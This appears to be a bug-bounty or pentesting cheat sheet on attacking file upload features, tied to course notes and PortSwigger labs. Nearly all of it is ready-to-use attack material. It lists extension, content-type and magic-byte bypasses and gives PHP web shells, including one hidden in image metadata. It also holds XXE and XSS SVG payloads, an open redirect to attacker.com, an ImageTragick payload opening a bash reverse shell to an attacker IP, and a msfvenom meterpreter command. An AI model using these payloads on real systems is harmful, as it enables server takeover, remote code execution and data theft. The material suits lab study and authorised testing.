- **==File Upload Exploitation==**
    
    - **==File upload To XSS==**
        
        ```
        ## file upload  through XSSupload a picture file, intercept it, change picturename.jpg to xss payload using intruder attack
        ```
        
    
    - ==**Open Redirect when uploading svg files**==
        
        ```
        <code><?xml version="1.0" encoding="UTF-8" standalone="yes"?><svgonload="window.location='http://www.google.com'"xmlns="http://www.w3.org/2000/svg"></svg></code>
        ```
        
    

[[Ebrahim Heagazy course Notes]]

[[Methodology]]

```
# File name validation    # extension blacklisted:    PHP: .phtm, phtml, .phps, .pht, .php2, .php3, .php4, .php5, .shtml, .phar, .pgif, .inc    ASP: .asp, .aspx, .cer, .asa    Jsp: .jsp, .jspx, .jsw, .jsv, .jspf    Coldfusion: .cfm, .cfml, .cfc, .dbm    Using random capitalization: .pHp, .pHP5, .PhAr    pht,phpt,phtml,php3,php4,php5,php6,php7,phar,pgif,phtm,phps,shtml,phar,pgif,inc    # extension whitelisted:    file.jpg.php    file.php.jpg    file.php.blah123jpg    file.php%00.jpg    file.php\x00.jpg    file.php%00    file.php%20    file.php%0d%0a.jpg    file.php.....    file.php/    file.php.\    file.    .html# Content type bypass    - Preserve name, but change content-type    Content-Type: image/jpeg, image/gif, image/png# Content length:    # Small bad code:    <?='$_GET[x]'?>    # Impact by extensionasp, aspx, php5, php, php3: webshell, rcesvg: stored xss, ssrf, xxegif: stored xss, ssrfcsv: csv injectionxml: xxeavi: lfi, ssrfhtml, js: html injection, xss, open redirectpng, jpeg: pixel flood attack doszip: rce via lfi, dospdf, pptx: ssrf, blind xxe# Path traversal../../etc/passwd/logo.png../../../logo.png# SQLi'sleep(10).jpgsleep(10)-- -.jpg# Command injection; sleep 10;# ImageTragick | http://4lemon.ru/2017-01-17_facebook_imagetragick_remote_code_execution.htmlpush graphic-contextviewbox 0 0 640 480fill 'url(https://127.0.0.1/test.jpg"|bash -i >& /dev/tcp/attacker-ip/attacker-port 0>&1|touch "hello)'pop graphic-context# XXE .svg<?xml version="1.0" standalone="yes"?><!DOCTYPE test [ <!ENTITY xxe SYSTEM "file:///etc/hostname" > ]><svg width="500px" height="500px" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink" version="1.1<text font-size="40" x="0" y="16">&xxe;</text></svg><svg xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink" width="300" version="1.1" height="200"><image xlink:href="expect://ls"></image></svg># XSS svg<svg onload=alert(document.comain)>.svg<?xml version="1.0" standalone="no"?><!DOCTYPE svg PUBLIC "-//W3C//DTD SVG 1.1//EN" "http://www.w3.org/Graphics/SVG/1.1/DTD/svg11.dtd">File Upload Checklist 3<svg version="1.1" baseProfile="full" xmlns="http://www.w3.org/2000/svg"><rect width="300" height="100" style="fill:rgb(0,0,255);stroke-width:3;stroke:rgb(0,0,0)" /><script type="text/javascript">alert("HolyBugx XSS");</script></svg># Open redirect svg<code><?xml version="1.0" encoding="UTF-8" standalone="yes"?><svgonload="window.location='https://attacker.com'"xmlns="http://www.w3.org/2000/svg"><rect width="300" height="100" style="fill:rgb(0,0,255);stroke-width:3;stroke:rgb(0,0,0)" /></svg></code>    # Filter Bypassing Techniques# upload asp file using .cer & .asa extension (IIS — Windows)# Upload .eml file when content-type = text/HTML# Inject null byte shell.php%001.jpg# Check for .svg file upload you can achieve stored XSS using XML payload# put file name ../../logo.png or ../../etc/passwd/logo.png to get directory traversal via upload file# Upload large size file for DoS attack test using the image.# (magic number) upload shell.php change content-type to image/gif and start content with GIF89a; will do the job!# If web app allows for zip upload then rename the file to pwd.jpg bcoz developer handle it via command# upload the file using SQL command 'sleep(10).jpg you may achieve SQL if image directly saves to DB.# Advance Bypassing techniques# Imagetragick aka ImageMagick:https://mukarramkhalid.com/imagemagick-imagetragick-exploit/https://github.com/neex/gifoeb    # Upload file toolhttps://github.com/almandin/fuxploiderpython3 fuxploider.py --url https://example.com --not-regex "wrong file type"https://github.com/sAjibuu/upload_bypass
```

### Fast tests

```
<?php echo system('id'); ?><?php echo system($_GET['command']); ?> --> GET /example/exploit.php?command=id HTTP/1.1
```

- [ ] [**Web shell upload via Content-Type restriction bypass**](https://portswigger.net/web-security/file-upload/lab-file-upload-web-shell-upload-via-content-type-restriction-bypass)
- [ ] [**Web shell upload via path traversal**](https://portswigger.net/web-security/file-upload/lab-file-upload-web-shell-upload-via-path-traversal)
- [ ] [**Web shell upload via extension blacklist bypass**](https://portswigger.net/web-security/file-upload/lab-file-upload-web-shell-upload-via-extension-blacklist-bypass) **[Overriding the server configuration]**
- [ ] [**Web shell upload via obfuscated file extension**](https://portswigger.net/web-security/file-upload/lab-file-upload-web-shell-upload-via-obfuscated-file-extension) **→** 1. `filename="exploit.php%00.jpg"`
- [ ] [**Remote code execution via polyglot web shell upload**](https://portswigger.net/web-security/file-upload/lab-file-upload-remote-code-execution-via-polyglot-web-shell-upload)

# Testing For File-Upload and Exploiting.

[![](https://blog.yeswehack.com/wp-content/uploads/mindmap.png.webp)](https://blog.yeswehack.com/wp-content/uploads/mindmap.png.webp)

## Base Step

```
1. Browse the site and find each upload functionality.2. Start with basic test by simply uploading a web shell using Weevely	`weevely generate <password> <path>`																	OR	 Use Msfvenom `msfvenom -p php/meterpreter/reverse_tcp lhost=10.10.10.8 lport=4444 -f raw`3. Try the extension bypasses if that fails4. Try changing content-type to bypass5. Try Magic number bypass6. Try Polygot or PNG IDAT chunks bypass7. Finally if successful then upload small POC or exploit further.
```

## Test Case - 1: Blacklisting Bypass.

```
1. Find the upload request and send it to the repeater2. Now start testing which extension for the file is blacklisted, change the `filename=` ParameterPOST /images/upload/ HTTP/1.1Host: target.com[...]---------------------------829348923824Content-Disposition: form-data; name="uploaded"; filename="dapos.php"Content-Type: application/x-php3. Try all of this extension**PHP** → .phtm, phtml, .phps, .pht, .php2, .php3, .php4, .php5, .shtml, .phar, .pgif, .inc**ASP** → asp, .aspx, .cer, .asa**Jsp** → .jsp, .jspx, .jsw, .jsv, .jspf**Coldfusion** → .cfm, .cfml, .cfc, .dbm**Using random capitalization** → .pHp, .pHP5, .PhArFind more in PayloadAllThings and <https://book.hacktricks.xyz/pentesting-web/file-upload>4. If successful then exploit further, or there might be other type of validation or	 check so try other bypass.
```

## Test Case - 2: Whitelisting Bypass

```
1. Find the upload request and send it to the repeater2. Now start testing which extension for the file is whitelisted, change the `filename=` ParameterPOST /images/upload/ HTTP/1.1Host: target.com[...]---------------------------829348923824Content-Disposition: form-data; name="uploaded"; filename="dapos.jpg"Content-Type: application/x-php3. Try all of this extensionfile.jpg.phpfile.php.jpgfile.php.blah123jpgfile.php%00.jpgfile.php\\x00.jpg this can be done while uploading the file too, name it file.phpD.jpg and change the D (44) in hex to 00.file.php%00file.php%20file.php%0d%0a.jpgfile.php.....file.php/file.php.\\file.php#.pngfile..html4. If doesn't works then try to bruteforce using intruder which extension are accepted and try again5. If successful then exploit further, or there might be other type of validation or	 check so try other bypass.
```

## Test Case - 3: Content-type validation

```
1. Find the upload request and send it to the repeater2. Upload file.php and change the Content-type: application/x-php or Content-Type : application/octet-stream to Content-type: image/png or Content-type: image/gif or Content-type: image/jpgPOST /images/upload/ HTTP/1.1Host: target.com[...]---------------------------829348923824Content-Disposition: form-data; name="uploaded"; filename="dapos.php"Content-Type: application/x-php3. If successful then exploit further, or there might be other type of validation or	 check so try other bypass.
```

## Test Case - 4: Content-Length validation

```
1. Find the upload request and send it to the repeater2. Try all three above bypass first, if they doesn't works then see if file size is been	 checked. Try all four of this case in combo for more success rate.POST /images/upload/ HTTP/1.1Host: target.com[...]---------------------------829348923824Content-Disposition: form-data; name="uploaded"; filename="dapos.php"Content-Type: application/x-php[...]3. Try small file payload like<?=`$_GET[x]`?><?=‘ls’;   Note : <? work for “short_open_tag=On” in php.ini ( Default=On )4. Finally the request should look like this. if this worked then try to access this file	 For Example: <http://example.com/compromised_file.php?x=cat%20%2Fetc%2Fpasswd>POST /images/upload/ HTTP/1.1Host: target.com[...]---------------------------829348923824Content-Disposition: form-data; name="uploaded"; filename="dapos.php"Content-Type: application/x-php<?=`$_GET[x]`?>5. Dont stop here, upload better shell and try to see if you can find something more	 critical like DB_.
```

## Test Case - 5: Content Bypass / Using Magic Bytes

```
1. Find the upload request and send it to the repeater2. Try all Four above bypass first, if they doesn't works then see if file content is been	 checked. Try all five of this case in combo for more success rate.POST /images/upload/ HTTP/1.1Host: target.com[...]---------------------------829348923824Content-Disposition: form-data; name="uploaded"; filename="dapos.php"Content-Type: application/x-php[...]3. Change the Content-Type: application/x-php to Content-Type: image/gif and Add the	 text "GIF89a;" before you shell-code.POST /images/upload/ HTTP/1.1Host: target.com[...]---------------------------829348923824Content-Disposition: form-data; name="uploaded"; filename="dapos.php"Content-Type: image/gifGIF89a; <?php system($_GET['cmd']); ?>4. Try more from here <https://en.wikipedia.org/wiki/List_of_file_signatures> and change	 Content-Type: accordingly5. If successful upload better Shell and POC, and see how can you increase critically.
```

## Test Case - 6: Magic Bytes and Metadata Shell

```
1. Find the upload request and send it to the repeater2. Try all above bypass first, if they doesn't works then see if file content is been	 checked. Try all six of this case in combo for more success rate.POST /images/upload/ HTTP/1.1Host: target.com[...]---------------------------829348923824Content-Disposition: form-data; name="uploaded"; filename="dapos.php"Content-Type: application/x-php[...]4. First Bypass Content-Type checks by setting the value of the	 Content-Type header to: image/png , text/plain , application/octet-stream5. Introduce the shell inside the metadata using tool exiftool.exiftool -Comment="<?php echo 'Command:'; if($_POST){system($_POST['cmd']);} __halt_compiler();" img.jpg6. Now try uploading this modified img.jpg7. Exploit further to increase critically.
```

## Test Case - 7: Uploading Configuration Files

```
1. Find the upload request and send it to the repeater2. Now try to upload .htaccess file if the app is using php server or else	 try to upload .config is app is using ASP server3. If you can upload a .htaccess, then you can configure several things and	 even execute code (configuring that files with extension .htaccess can be executed).	 Different .htaccess shells can be found here: <https://github.com/wireghoul/htshells>																	OR	 If you can upload .config files and use them to execute code. One way to do it	 is appending the code at the end of the file inside an HTML comment: <https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Upload%20Insecure%20Files/Configuration%20IIS%20web.config>	 More information and techniques to exploit this vulnerability here: <https://soroush.secproject.com/blog/2014/07/upload-a-web-config-file-for-fun-profit/>4. Try to exploit now that server config is changed upload the shell	 For example if you uploaded .htaccess file with	 AddType application/x-httpd-php .png in content this configuration would instruct	 the Apache HTTP Server to execute PNG images as though they were PHP scripts.5. Now simply upload our php shell file with extension .png6. Done, try to exploit further.
```

## Test Case - 8: Try Zip Slip Upload

```
1. Find the upload request and send it to the repeater2. Now check if .zip file is allowed to upload3. If a site accepts .zip file, upload .php and compress it into .zip and upload it.4. Now visit, site.com/path?page=zip://path/file.zip%23rce.phpIf you also try this tool and info here: <https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Upload%20Insecure%20Files/Zip%20Slip>
```

## Test Case -9 : Try ImageMagick

```
Check Reference : <https://hackerone.com/reports/302885> , <https://medium.com/@kunal94/imagemagick-gif-coder-vulnerability-leads-to-memory-disclosure-hackerone-e9975a6a560e>1. Find the upload functionality like profile pic upload.2. Git clone <https://github.com/neex/gifoeb> in you system.3. Goto gifoeb directory and run this command../gifoeb gen 512x512 dump.gif   This will create exploitable dump.gif file where 512x512 is pixel dimension and	 dump.gif is an gif file.   You can also try to bypass some checks.	 a) ./gifoeb gen 1123x987 dump.jpg	 b) ./gifoeb gen 1123x987 dump.png	 c) ./gifoeb gen 1123x987 dump.bmp	 d) ./gifoeb gen 1123x987 dump.tiff	 e) ./gifoeb gen 1123x987 dump.tif	(It will create the dump files with different extensions. Try with which site works)4. After creation of exploitable files, just upload in the profile settings.	 using modified Image files.5. Server will return different pixel files. Download this file.6. Save and recover the pixel files.	for p in previews/*; do    ./gifoeb recover $p | strings;	done7. More details here <https://github.com/neex/gifoeb>########################### Another Different method ############################\#Reference : <https://www.exploit-db.com/exploits/39767> , <https://hackerone.com/reports/135072>1. Find Upload functionality.2. Make a file with .mvg extension and add below code in it.push graphic-contextviewbox 0 0 640 480fill 'url(<http://example.com/>)'pop graphic-contextHere example.com can be your burp collab url or your site were you can receive HTTP request.3. Now use below commandconvert ssrf.mvg out.png4. Upload the image and see if you received http request.Find ready made and more payloads here: <https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Upload%20Insecure%20Files/Picture%20Image%20Magik>
```